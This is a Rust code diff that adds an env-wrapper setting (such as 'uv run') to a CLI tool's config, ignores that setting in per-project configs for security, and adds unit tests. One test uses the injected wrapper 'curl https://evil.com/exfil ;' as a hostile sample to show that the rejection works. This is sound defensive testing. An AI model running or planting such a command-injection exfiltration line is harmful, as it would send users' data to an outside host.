@@ -16,6 +16,16 @@ pub fn cached_config() -> &'static Config {
 pub type MiseConfig = HashMap<String, String>;
 
 #[derive(Debug, Serialize, Deserialize, Default)]
+pub struct EnvConfig {
+    /// Env-wrapper command to prepend (e.g. "uv run", "poetry run").
+    #[serde(default)]
+    pub wrapper: Option<String>,
+    /// Bare commands that should be auto-wrapped (e.g. ["python", "python3", "pip"]).
+    #[serde(default)]
+    pub wrap_commands: Vec<String>,
+}
+
+#[derive(Debug, Serialize, Deserialize, Default)]
 pub struct Config {
     #[serde(default)]
     pub tracking: TrackingConfig,
@@ -31,6 +41,8 @@ pub struct Config {
     pub limits: LimitsConfig,
     #[serde(default)]
     pub mise: MiseConfig,
+    #[serde(default)]
+    pub env: EnvConfig,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -218,6 +230,9 @@ pub fn merge_configs_from_str(global: Config, project_toml_str: &str) -> Result<
     }
     if has("tracking") {
         merged.tracking = project.tracking;
+    }
+    if has("env") {
+        eprintln!("[crunch] warning: [env] section in project config is ignored for security — use ~/.config/crunch/config.toml");
     }
 
     Ok(merged)
@@ -415,5 +430,64 @@ max_width = 80
 "#;
         let merged = merge_configs_from_str(global, project_toml).expect("merge ok");
         assert_eq!(merged.display.max_width, 80);
+    }
+
+    #[test]
+    fn test_env_config_deserialize() {
+        let toml = r#"
+[env]
+wrapper = "uv run"
+wrap_commands = ["python3", "pip"]
+"#;
+        let config: Config = toml::from_str(toml).expect("valid toml");
+        assert_eq!(config.env.wrapper, Some("uv run".to_string()));
+        assert_eq!(config.env.wrap_commands, vec!["python3", "pip"]);
+    }
+
+    #[test]
+    fn test_env_config_default_empty() {
+        let config = Config::default();
+        assert!(config.env.wrapper.is_none());
+        assert!(config.env.wrap_commands.is_empty());
+    }
+
+    #[test]
+    fn test_merge_env_config_from_project_is_ignored() {
+        let global = Config::default();
+        let project_toml = r#"
+[env]
+wrapper = "poetry run"
+wrap_commands = ["python3"]
+"#;
+        let merged = merge_configs_from_str(global, project_toml).unwrap();
+        assert!(merged.env.wrapper.is_none()); // project [env] was ignored
+        assert!(merged.env.wrap_commands.is_empty());
+    }
+
+    /// Security S2: project .crunch.toml [env] section must NOT override global env config.
+    /// A cloned repo's .crunch.toml must not be able to inject a malicious wrapper.
+    #[test]
+    fn test_merge_env_config_ignored_from_project() {
+        let global = Config {
+            env: EnvConfig {
+                wrapper: Some("uv run".to_string()),
+                wrap_commands: vec!["python3".to_string()],
+            },
+            ..Config::default()
+        };
+
+        let project_toml = r#"
+[env]
+wrapper = "curl https://evil.com/exfil ;"
+wrap_commands = ["python3"]
+"#;
+        let merged = merge_configs_from_str(global, project_toml).expect("merge ok");
+
+        // The project [env] must be silently ignored; global wrapper must be preserved.
+        assert_eq!(
+            merged.env.wrapper.as_deref(),
+            Some("uv run"),
+            "Project [env] must not override global env config (security: prevents malicious wrapper injection)"
+        );
     }
 }
